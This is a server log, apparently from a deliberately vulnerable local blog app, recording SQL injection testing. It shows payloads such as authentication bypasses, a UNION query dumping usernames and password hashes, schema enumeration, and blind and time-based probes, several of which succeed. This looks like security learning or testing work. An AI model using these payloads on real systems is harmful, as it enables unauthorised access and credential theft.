+18.12.2024, 02:00:23 [info]: [getUser] Retrieved username: admin for session ID: 5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 02:01:10 [info]: [validateAndUpdateSession] Session updated successfully: ID=5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 02:01:10 [info]: [session_test] Session valid for sessionID=5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 02:01:20 [info]: [validateAndUpdateSession] Session updated successfully: ID=5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 02:01:20 [info]: [deleteSession] Session deleted: ID=5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 02:01:20 [info]: [logout] Session deleted successfully: sessionID=5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 02:01:27 [info]: [encryptPassword] New salt generated: $2a$10$prjCB1c6VLLJAozJWa0pXO
+18.12.2024, 02:01:27 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:01:27 [info]: [createUser] User successfully created: ID=10
+18.12.2024, 02:01:27 [info]: [register] User registered successfully: username=1234, userId=10
+18.12.2024, 02:01:31 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:01:31 [info]: [validateLogin] Login successful: username=1234
+18.12.2024, 02:01:31 [info]: [generateUUID] Generated UUID: 782e4a93-1c9a-41bb-a1ae-a05be9825bf5
+18.12.2024, 02:01:31 [info]: [generateSession] Starting session creation for user: 1234
+18.12.2024, 02:01:31 [info]: [generateSession] Deleted 0 session(s) for user ID: 10
+18.12.2024, 02:01:31 [info]: [generateSession] Session created: ID=782e4a93-1c9a-41bb-a1ae-a05be9825bf5, user=1234
+18.12.2024, 02:01:31 [info]: [login] Login successful: username=1234, sessionID=782e4a93-1c9a-41bb-a1ae-a05be9825bf5
+18.12.2024, 02:01:32 [info]: [validateAndUpdateSession] Session updated successfully: ID=782e4a93-1c9a-41bb-a1ae-a05be9825bf5
+18.12.2024, 02:01:32 [info]: [getUser] Retrieved username: 1234 for session ID: 782e4a93-1c9a-41bb-a1ae-a05be9825bf5
+18.12.2024, 02:01:33 [info]: [validateAndUpdateSession] Session updated successfully: ID=782e4a93-1c9a-41bb-a1ae-a05be9825bf5
+18.12.2024, 02:01:33 [info]: [deleteSession] Session deleted: ID=782e4a93-1c9a-41bb-a1ae-a05be9825bf5
+18.12.2024, 02:01:33 [info]: [logout] Session deleted successfully: sessionID=782e4a93-1c9a-41bb-a1ae-a05be9825bf5
+18.12.2024, 02:01:43 [info]: [encryptPassword] New salt generated: $2a$10$LJ1p029p.IIyU6sJFnQ5Y.
+18.12.2024, 02:01:43 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:01:43 [info]: [createUser] User successfully created: ID=11
+18.12.2024, 02:01:43 [info]: [register] User registered successfully: username=elvis, userId=11
+18.12.2024, 02:01:54 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:01:54 [info]: [validateLogin] Incorrect password: username=admin
+18.12.2024, 02:01:54 [info]: [login] Unauthorized login attempt: username=admin
+18.12.2024, 02:01:59 [info]: [validateLogin] User not found: username=admin'-- 
+18.12.2024, 02:01:59 [info]: [login] Unauthorized login attempt: username=admin'-- 
+18.12.2024, 02:02:11 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:02:11 [info]: [validateLogin] Login successful: username=admin'--  
+18.12.2024, 02:02:11 [info]: [generateUUID] Generated UUID: 2d5073ed-a28e-4da5-9e11-8d045d220f1a
+18.12.2024, 02:02:11 [info]: [generateSession] Starting session creation for user: admin'--  
+18.12.2024, 02:02:11 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 02:02:11 [info]: [generateSession] Session created: ID=2d5073ed-a28e-4da5-9e11-8d045d220f1a, user=admin'--  
+18.12.2024, 02:02:11 [info]: [login] Login successful: username=admin'--  , sessionID=2d5073ed-a28e-4da5-9e11-8d045d220f1a
+18.12.2024, 02:02:11 [info]: [validateAndUpdateSession] Session updated successfully: ID=2d5073ed-a28e-4da5-9e11-8d045d220f1a
+18.12.2024, 02:02:12 [info]: [getUser] Retrieved username: admin for session ID: 2d5073ed-a28e-4da5-9e11-8d045d220f1a
+18.12.2024, 02:02:30 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT id, username, password FROM users -- %'
+        
+18.12.2024, 02:02:30 [info]: [unsafe_searchPosts] Query executed successfully, returned 6 result(s)
+18.12.2024, 02:04:36 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT 1, @@version, 3 -- %'
+        
+18.12.2024, 02:04:36 [info]: [unsafe_searchPosts] Query executed successfully, returned 4 result(s)
+18.12.2024, 02:04:46 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT 1, DATABASE(), 3 -- %'
+        
+18.12.2024, 02:04:46 [info]: [unsafe_searchPosts] Query executed successfully, returned 4 result(s)
+18.12.2024, 02:04:56 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT 1, table_name, 3 FROM information_schema.tables -- %'
+        
+18.12.2024, 02:04:56 [info]: [unsafe_searchPosts] Query executed successfully, returned 332 result(s)
+18.12.2024, 02:08:43 [info]: [validateAndUpdateSession] Session updated successfully: ID=2d5073ed-a28e-4da5-9e11-8d045d220f1a
+18.12.2024, 02:08:43 [info]: [deleteSession] Session deleted: ID=2d5073ed-a28e-4da5-9e11-8d045d220f1a
+18.12.2024, 02:08:43 [info]: [logout] Session deleted successfully: sessionID=2d5073ed-a28e-4da5-9e11-8d045d220f1a
+18.12.2024, 02:08:50 [info]: [validateLogin] User not found: username=admin' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- 
+18.12.2024, 02:08:50 [info]: [login] Unauthorized login attempt: username=admin' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- 
+18.12.2024, 02:09:36 [info]: [validateLogin] User not found: username=admin' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(5), 0) -- 
+18.12.2024, 02:09:36 [info]: [login] Unauthorized login attempt: username=admin' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(5), 0) -- 
+18.12.2024, 02:09:42 [info]: [validateLogin] User not found: username=admin' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(5), 0) -- 
+18.12.2024, 02:09:42 [info]: [login] Unauthorized login attempt: username=admin' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(5), 0) -- 
+18.12.2024, 02:10:03 [info]: [validateLogin] User not found: username=admin' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(5), 0) -- 
+18.12.2024, 02:10:03 [info]: [login] Unauthorized login attempt: username=admin' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(5), 0) -- 
+18.12.2024, 02:10:57 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:10:58 [info]: [validateLogin] Login successful: username=admin' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- 
+18.12.2024, 02:10:58 [info]: [generateUUID] Generated UUID: 1b5b0e6a-9f30-4b60-b5de-438e304b2040
+18.12.2024, 02:10:58 [info]: [generateSession] Starting session creation for user: admin' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- 
+18.12.2024, 02:10:58 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 02:10:58 [info]: [generateSession] Session created: ID=1b5b0e6a-9f30-4b60-b5de-438e304b2040, user=admin' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- 
+18.12.2024, 02:10:58 [info]: [login] Login successful: username=admin' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- , sessionID=1b5b0e6a-9f30-4b60-b5de-438e304b2040
+18.12.2024, 02:10:58 [info]: [validateAndUpdateSession] Session updated successfully: ID=1b5b0e6a-9f30-4b60-b5de-438e304b2040
+18.12.2024, 02:10:58 [info]: [getUser] Retrieved username: admin for session ID: 1b5b0e6a-9f30-4b60-b5de-438e304b2040
+18.12.2024, 02:11:03 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- CII(SUBSTRING(username, 1, 1)) = ' at line 1
+18.12.2024, 02:11:03 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- CII(SUBSTRING(username, 1, 1)) = ' at line 1
+18.12.2024, 02:11:07 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:11:07 [info]: [validateLogin] Login successful: username=admin' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- 
+18.12.2024, 02:11:07 [info]: [generateUUID] Generated UUID: aa62c8cc-3108-455b-ae9e-b6c043d503b9
+18.12.2024, 02:11:07 [info]: [generateSession] Starting session creation for user: admin' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- 
+18.12.2024, 02:11:08 [info]: [generateSession] Deleted 1 session(s) for user ID: 9
+18.12.2024, 02:11:08 [info]: [generateSession] Session created: ID=aa62c8cc-3108-455b-ae9e-b6c043d503b9, user=admin' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- 
+18.12.2024, 02:11:08 [info]: [login] Login successful: username=admin' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- , sessionID=aa62c8cc-3108-455b-ae9e-b6c043d503b9
+18.12.2024, 02:11:08 [info]: [validateAndUpdateSession] Session updated successfully: ID=aa62c8cc-3108-455b-ae9e-b6c043d503b9
+18.12.2024, 02:11:08 [info]: [getUser] Retrieved username: admin for session ID: aa62c8cc-3108-455b-ae9e-b6c043d503b9
+18.12.2024, 02:13:20 [info]: [validateAndUpdateSession] Session updated successfully: ID=aa62c8cc-3108-455b-ae9e-b6c043d503b9
+18.12.2024, 02:13:20 [info]: [deleteSession] Session deleted: ID=aa62c8cc-3108-455b-ae9e-b6c043d503b9
+18.12.2024, 02:13:20 [info]: [logout] Session deleted successfully: sessionID=aa62c8cc-3108-455b-ae9e-b6c043d503b9
+18.12.2024, 02:21:13 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:21:13 [info]: [validateLogin] Login successful: username=elvis' OR '1'='1
+18.12.2024, 02:21:13 [info]: [generateUUID] Generated UUID: 292b7860-7008-437d-a525-bbb8efaa1f32
+18.12.2024, 02:21:13 [info]: [generateSession] Starting session creation for user: elvis' OR '1'='1
+18.12.2024, 02:21:13 [info]: [generateSession] Deleted 0 session(s) for user ID: 10
+18.12.2024, 02:21:13 [info]: [generateSession] Session created: ID=292b7860-7008-437d-a525-bbb8efaa1f32, user=elvis' OR '1'='1
+18.12.2024, 02:21:13 [info]: [login] Login successful: username=elvis' OR '1'='1, sessionID=292b7860-7008-437d-a525-bbb8efaa1f32
+18.12.2024, 02:21:13 [info]: [validateAndUpdateSession] Session updated successfully: ID=292b7860-7008-437d-a525-bbb8efaa1f32
+18.12.2024, 02:21:14 [info]: [getUser] Retrieved username: 1234 for session ID: 292b7860-7008-437d-a525-bbb8efaa1f32
+18.12.2024, 02:21:16 [info]: [validateAndUpdateSession] Session updated successfully: ID=292b7860-7008-437d-a525-bbb8efaa1f32
+18.12.2024, 02:21:17 [info]: [getUser] Retrieved username: 1234 for session ID: 292b7860-7008-437d-a525-bbb8efaa1f32
+18.12.2024, 02:21:35 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:21:35 [info]: [validateLogin] Login successful: username=elvis' -- 
+18.12.2024, 02:21:35 [info]: [generateUUID] Generated UUID: 0037e81f-9efc-4a93-8e7c-84991242486c
+18.12.2024, 02:21:35 [info]: [generateSession] Starting session creation for user: elvis' -- 
+18.12.2024, 02:21:35 [info]: [generateSession] Deleted 0 session(s) for user ID: 11
+18.12.2024, 02:21:36 [info]: [generateSession] Session created: ID=0037e81f-9efc-4a93-8e7c-84991242486c, user=elvis' -- 
+18.12.2024, 02:21:36 [info]: [login] Login successful: username=elvis' -- , sessionID=0037e81f-9efc-4a93-8e7c-84991242486c
+18.12.2024, 02:21:36 [info]: [validateAndUpdateSession] Session updated successfully: ID=0037e81f-9efc-4a93-8e7c-84991242486c
+18.12.2024, 02:21:37 [info]: [getUser] Retrieved username: elvis for session ID: 0037e81f-9efc-4a93-8e7c-84991242486c
+18.12.2024, 02:22:13 [info]: [validateAndUpdateSession] Session updated successfully: ID=0037e81f-9efc-4a93-8e7c-84991242486c
+18.12.2024, 02:22:13 [info]: [deleteSession] Session deleted: ID=0037e81f-9efc-4a93-8e7c-84991242486c
+18.12.2024, 02:22:13 [info]: [logout] Session deleted successfully: sessionID=0037e81f-9efc-4a93-8e7c-84991242486c
+18.12.2024, 02:22:24 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:22:24 [info]: [validateLogin] Login successful: username=user1
+18.12.2024, 02:22:24 [info]: [generateUUID] Generated UUID: 89f4b45c-f856-47bc-9d72-19e985655aa1
+18.12.2024, 02:22:24 [info]: [generateSession] Starting session creation for user: user1
+18.12.2024, 02:22:24 [info]: [generateSession] Deleted 1 session(s) for user ID: 10
+18.12.2024, 02:22:24 [info]: [generateSession] Session created: ID=89f4b45c-f856-47bc-9d72-19e985655aa1, user=user1
+18.12.2024, 02:22:24 [info]: [login] Login successful: username=user1, sessionID=89f4b45c-f856-47bc-9d72-19e985655aa1
+18.12.2024, 02:22:24 [info]: [validateAndUpdateSession] Session updated successfully: ID=89f4b45c-f856-47bc-9d72-19e985655aa1
+18.12.2024, 02:22:25 [info]: [getUser] Retrieved username: user1 for session ID: 89f4b45c-f856-47bc-9d72-19e985655aa1
+18.12.2024, 02:22:26 [info]: [validateAndUpdateSession] Session updated successfully: ID=89f4b45c-f856-47bc-9d72-19e985655aa1
+18.12.2024, 02:22:26 [info]: [deleteSession] Session deleted: ID=89f4b45c-f856-47bc-9d72-19e985655aa1
+18.12.2024, 02:22:26 [info]: [logout] Session deleted successfully: sessionID=89f4b45c-f856-47bc-9d72-19e985655aa1
+18.12.2024, 02:22:40 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:22:40 [info]: [validateLogin] Incorrect password: username=' OR '1'='1
+18.12.2024, 02:22:40 [info]: [login] Unauthorized login attempt: username=' OR '1'='1
+18.12.2024, 02:22:46 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:22:46 [info]: [validateLogin] Incorrect password: username=' OR '1'='1 
+18.12.2024, 02:22:46 [info]: [login] Unauthorized login attempt: username=' OR '1'='1 
+18.12.2024, 02:23:02 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:23:02 [info]: [validateLogin] Incorrect password: username=asd' OR '1'='1 
+18.12.2024, 02:23:02 [info]: [login] Unauthorized login attempt: username=asd' OR '1'='1 
+18.12.2024, 02:23:17 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:23:17 [info]: [validateLogin] Incorrect password: username=' OR '1'='1
+18.12.2024, 02:23:17 [info]: [login] Unauthorized login attempt: username=' OR '1'='1
+18.12.2024, 02:23:27 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:23:27 [info]: [validateLogin] Incorrect password: username=asds' OR '1'='1
+18.12.2024, 02:23:27 [info]: [login] Unauthorized login attempt: username=asds' OR '1'='1
+18.12.2024, 02:23:36 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 02:23:36 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 02:23:43 [info]: Loading route file: route_account_management.js
+18.12.2024, 02:23:43 [info]: Loading route file: route_blog.js
+18.12.2024, 02:23:43 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 02:23:43 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 02:23:43 [info]: Server is running on http://localhost:3000
+18.12.2024, 02:23:43 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 02:23:44 [info]: Database connection established
+18.12.2024, 02:23:51 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:23:52 [info]: [validateLogin] Login successful: username=admin
+18.12.2024, 02:23:52 [info]: [generateUUID] Generated UUID: eb7b0636-bb9e-4fd4-b77e-5ea2e9cee1fc
+18.12.2024, 02:23:52 [info]: [generateSession] Starting session creation for user: admin
+18.12.2024, 02:23:52 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 02:23:52 [info]: [generateSession] Session created: ID=eb7b0636-bb9e-4fd4-b77e-5ea2e9cee1fc, user=admin
+18.12.2024, 02:23:52 [info]: [login] Login successful: username=admin, sessionID=eb7b0636-bb9e-4fd4-b77e-5ea2e9cee1fc
+18.12.2024, 02:23:52 [info]: [validateAndUpdateSession] Session updated successfully: ID=eb7b0636-bb9e-4fd4-b77e-5ea2e9cee1fc
+18.12.2024, 02:23:52 [info]: [getUser] Retrieved username: admin for session ID: eb7b0636-bb9e-4fd4-b77e-5ea2e9cee1fc
+18.12.2024, 02:23:53 [info]: [validateAndUpdateSession] Session updated successfully: ID=eb7b0636-bb9e-4fd4-b77e-5ea2e9cee1fc
+18.12.2024, 02:23:54 [info]: [deleteSession] Session deleted: ID=eb7b0636-bb9e-4fd4-b77e-5ea2e9cee1fc
+18.12.2024, 02:23:54 [info]: [logout] Session deleted successfully: sessionID=eb7b0636-bb9e-4fd4-b77e-5ea2e9cee1fc
+18.12.2024, 02:24:12 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:24:12 [info]: [validateLogin] Login successful: username=admin' -- 
+18.12.2024, 02:24:12 [info]: [generateUUID] Generated UUID: c387bf5a-8872-4c6b-b363-6c97fed64772
+18.12.2024, 02:24:12 [info]: [generateSession] Starting session creation for user: admin' -- 
+18.12.2024, 02:24:12 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 02:24:12 [info]: [generateSession] Session created: ID=c387bf5a-8872-4c6b-b363-6c97fed64772, user=admin' -- 
+18.12.2024, 02:24:12 [info]: [login] Login successful: username=admin' -- , sessionID=c387bf5a-8872-4c6b-b363-6c97fed64772
+18.12.2024, 02:24:12 [info]: [validateAndUpdateSession] Session updated successfully: ID=c387bf5a-8872-4c6b-b363-6c97fed64772
+18.12.2024, 02:24:13 [info]: [getUser] Retrieved username: admin for session ID: c387bf5a-8872-4c6b-b363-6c97fed64772
+18.12.2024, 02:24:16 [info]: [validateAndUpdateSession] Session updated successfully: ID=c387bf5a-8872-4c6b-b363-6c97fed64772
+18.12.2024, 02:24:17 [info]: [deleteSession] Session deleted: ID=c387bf5a-8872-4c6b-b363-6c97fed64772
+18.12.2024, 02:24:17 [info]: [logout] Session deleted successfully: sessionID=c387bf5a-8872-4c6b-b363-6c97fed64772
+18.12.2024, 02:25:29 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:25:29 [info]: [validateLogin] Login successful: username=admin
+18.12.2024, 02:25:29 [info]: [generateUUID] Generated UUID: 37eea81f-7063-46dd-b687-b06aa282af2e
+18.12.2024, 02:25:29 [info]: [generateSession] Starting session creation for user: admin
+18.12.2024, 02:25:30 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 02:25:30 [info]: [generateSession] Session created: ID=37eea81f-7063-46dd-b687-b06aa282af2e, user=admin
+18.12.2024, 02:25:30 [info]: [login] Login successful: username=admin, sessionID=37eea81f-7063-46dd-b687-b06aa282af2e
+18.12.2024, 02:25:30 [info]: [validateAndUpdateSession] Session updated successfully: ID=37eea81f-7063-46dd-b687-b06aa282af2e
+18.12.2024, 02:25:31 [info]: [getUser] Retrieved username: admin for session ID: 37eea81f-7063-46dd-b687-b06aa282af2e
+18.12.2024, 02:25:32 [info]: [validateAndUpdateSession] Session updated successfully: ID=37eea81f-7063-46dd-b687-b06aa282af2e
+18.12.2024, 02:25:32 [info]: [deleteSession] Session deleted: ID=37eea81f-7063-46dd-b687-b06aa282af2e
+18.12.2024, 02:25:32 [info]: [logout] Session deleted successfully: sessionID=37eea81f-7063-46dd-b687-b06aa282af2e
+18.12.2024, 02:26:02 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 02:26:02 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 02:26:05 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:26:06 [info]: [validateLogin] Login successful: username=admin' -- 
+18.12.2024, 02:26:06 [info]: [generateUUID] Generated UUID: 4d8864c2-4a7b-4285-ad6e-0a6e81941ed6
+18.12.2024, 02:26:06 [info]: [generateSession] Starting session creation for user: admin' -- 
+18.12.2024, 02:26:06 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 02:26:06 [info]: [generateSession] Session created: ID=4d8864c2-4a7b-4285-ad6e-0a6e81941ed6, user=admin' -- 
+18.12.2024, 02:26:06 [info]: [login] Login successful: username=admin' -- , sessionID=4d8864c2-4a7b-4285-ad6e-0a6e81941ed6
+18.12.2024, 02:26:06 [info]: [validateAndUpdateSession] Session updated successfully: ID=4d8864c2-4a7b-4285-ad6e-0a6e81941ed6
+18.12.2024, 02:26:06 [info]: [getUser] Retrieved username: admin for session ID: 4d8864c2-4a7b-4285-ad6e-0a6e81941ed6
+18.12.2024, 02:26:08 [info]: [validateAndUpdateSession] Session updated successfully: ID=4d8864c2-4a7b-4285-ad6e-0a6e81941ed6
+18.12.2024, 02:26:08 [info]: [deleteSession] Session deleted: ID=4d8864c2-4a7b-4285-ad6e-0a6e81941ed6
+18.12.2024, 02:26:08 [info]: [logout] Session deleted successfully: sessionID=4d8864c2-4a7b-4285-ad6e-0a6e81941ed6
+18.12.2024, 02:32:21 [info]: [validateLogin] User not found: username=user
+18.12.2024, 02:32:21 [info]: [login] Unauthorized login attempt: username=user
+18.12.2024, 02:32:22 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 02:32:22 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 02:32:22 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'%3d'1'' at line 1
+18.12.2024, 02:32:22 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'%3d'1'' at line 1
+18.12.2024, 02:32:22 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'%3d'1'' at line 1
+18.12.2024, 02:32:22 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'%3d'1'' at line 1
+18.12.2024, 02:32:23 [info]: [login] Missing username or password
+18.12.2024, 02:32:23 [info]: [validateLogin] User not found: username=user
+18.12.2024, 02:32:23 [info]: [login] Unauthorized login attempt: username=user
+18.12.2024, 02:32:24 [info]: [validateLogin] User not found: username=user
+18.12.2024, 02:32:24 [info]: [login] Unauthorized login attempt: username=user
+18.12.2024, 02:32:24 [info]: [validateLogin] User not found: username=user
+18.12.2024, 02:32:24 [info]: [login] Unauthorized login attempt: username=user
+18.12.2024, 02:32:25 [info]: [login] Missing username or password
+18.12.2024, 02:32:31 [info]: [validateLogin] User not found: username=user
+18.12.2024, 02:32:31 [info]: [login] Unauthorized login attempt: username=user
+18.12.2024, 02:32:31 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 02:32:31 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 02:32:32 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'%3d'1'' at line 1
+18.12.2024, 02:32:32 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'%3d'1'' at line 1
+18.12.2024, 02:32:32 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'%3d'1'' at line 1
+18.12.2024, 02:32:32 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'%3d'1'' at line 1
+18.12.2024, 02:32:32 [info]: [login] Missing username or password
+18.12.2024, 02:32:33 [info]: [validateLogin] User not found: username=user
+18.12.2024, 02:32:33 [info]: [login] Unauthorized login attempt: username=user
+18.12.2024, 02:32:33 [info]: [validateLogin] User not found: username=user
+18.12.2024, 02:32:33 [info]: [login] Unauthorized login attempt: username=user
+18.12.2024, 02:32:34 [info]: [validateLogin] User not found: username=user
+18.12.2024, 02:32:34 [info]: [login] Unauthorized login attempt: username=user
+18.12.2024, 02:32:34 [info]: [login] Missing username or password
+18.12.2024, 02:33:16 [info]: [validateLogin] User not found: username=user
+18.12.2024, 02:33:16 [info]: [login] Unauthorized login attempt: username=user
+18.12.2024, 02:33:16 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 02:33:16 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 02:33:17 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'%3d'1'' at line 1
+18.12.2024, 02:33:17 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'%3d'1'' at line 1
+18.12.2024, 02:33:17 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'%3d'1'' at line 1
+18.12.2024, 02:33:17 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'%3d'1'' at line 1
+18.12.2024, 02:33:17 [info]: [login] Missing username or password
+18.12.2024, 02:34:19 [info]: [validateLogin] User not found: username=user
+18.12.2024, 02:34:19 [info]: [login] Unauthorized login attempt: username=user
+18.12.2024, 02:34:20 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:34:20 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:34:20 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'%3d'1'' at line 1
+18.12.2024, 02:34:20 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'%3d'1'' at line 1
+18.12.2024, 02:34:20 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'%3d'1'' at line 1
+18.12.2024, 02:34:20 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'%3d'1'' at line 1
+18.12.2024, 02:34:21 [info]: [login] Missing username or password
+18.12.2024, 02:34:52 [info]: [validateLogin] User not found: username=user
+18.12.2024, 02:34:52 [info]: [login] Unauthorized login attempt: username=user
+18.12.2024, 02:34:53 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:34:53 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:34:53 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'%3d'1'' at line 1
+18.12.2024, 02:34:53 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'%3d'1'' at line 1
+18.12.2024, 02:34:53 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'%3d'1'' at line 1
+18.12.2024, 02:34:53 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'%3d'1'' at line 1
+18.12.2024, 02:34:53 [info]: [login] Missing username or password
+18.12.2024, 02:35:31 [info]: [validateLogin] User not found: username=user
+18.12.2024, 02:35:31 [info]: [login] Unauthorized login attempt: username=user
+18.12.2024, 02:35:44 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:35:44 [info]: [validateLogin] Login successful: username=admin' -- 
+18.12.2024, 02:35:44 [info]: [generateUUID] Generated UUID: 68cd2f3a-03c2-49f8-8585-18bf86255cbb
+18.12.2024, 02:35:44 [info]: [generateSession] Starting session creation for user: admin' -- 
+18.12.2024, 02:35:45 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 02:35:45 [info]: [generateSession] Session created: ID=68cd2f3a-03c2-49f8-8585-18bf86255cbb, user=admin' -- 
